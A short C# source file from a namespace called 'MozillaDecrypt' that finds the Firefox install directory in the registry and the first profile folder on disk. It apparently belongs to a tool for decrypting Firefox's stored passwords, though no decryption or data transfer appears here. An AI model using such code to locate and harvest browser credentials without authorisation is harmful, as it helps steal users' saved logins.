using System;
using System.IO;
using Microsoft.Win32;

namespace MozillaDecrypt
{
    public class PathFireFox
    {
        private static readonly string DirectoryMozilla = @"SOFTWARE\Mozilla\Mozilla Firefox";
        private static readonly string LocalFireFoxDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox\Profiles");

        public static string GetRegistryFireFox(string Inst = "Install Directory", string SubDir = "Main", bool Recursive = true)
        {
            try
            {
                using (var Key = Registry.LocalMachine.OpenSubKey(DirectoryMozilla, Recursive))
                {
                    return Key?.OpenSubKey(Key.GetSubKeyNames()[0]).OpenSubKey(SubDir)?.GetValue(Inst)?.ToString();
                }
            }
            catch
            {
                return "FireFox not installed";
            }
        }

        public static DirectoryInfo GetLocationFireFox()
        {
            if (!Directory.Exists(LocalFireFoxDir))
            {
                return null;
            }
            return new DirectoryInfo(LocalFireFoxDir).GetDirectories().Length == 0 ? null : new DirectoryInfo(LocalFireFoxDir).GetDirectories()[0];
        }

        public static string GetRandomFF() => Directory.GetDirectories(LocalFireFoxDir)[0];
    }
}